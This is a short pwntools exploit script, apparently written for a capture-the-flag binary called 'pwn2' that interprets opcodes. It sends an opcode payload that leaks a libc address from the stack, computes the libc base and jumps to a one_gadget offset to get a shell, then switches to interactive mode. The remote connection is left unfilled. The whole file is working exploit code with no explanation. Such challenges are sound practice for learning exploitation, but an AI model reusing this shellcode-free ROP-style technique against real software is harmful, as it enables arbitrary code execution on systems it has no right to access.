#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process("./pwn2")
	elf = ELF("./pwn2")
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
	p = remote()
	elf = ELF("./")

#gdb.attach(p,'b *0x555555554A36')  #break where stack init end
#gdb.attach(p,'b *0x555555554A59')  #break where before command
#gdb.attach(p,'b *0x555555554BC2') #break where command 13
gdb.attach(p,'b *0x555555554B5C') #break where command 11


###get libc_start_main###
payload = p64(15)
payload+= p64(1) + p64(0xe8)
payload+= p64(26) + p64(13)
payload+= p64(9) + p64(13)
###get&&push libc_base###
payload+= p64(1) + p64(0x20830)
payload+= p64(26) + p64(13)
###get&&push one_gadget### 
payload+= p64(1) + p64(0x45216)
payload+= p64(25)
payload+= p64(11)

sla('code> ',payload)

ia()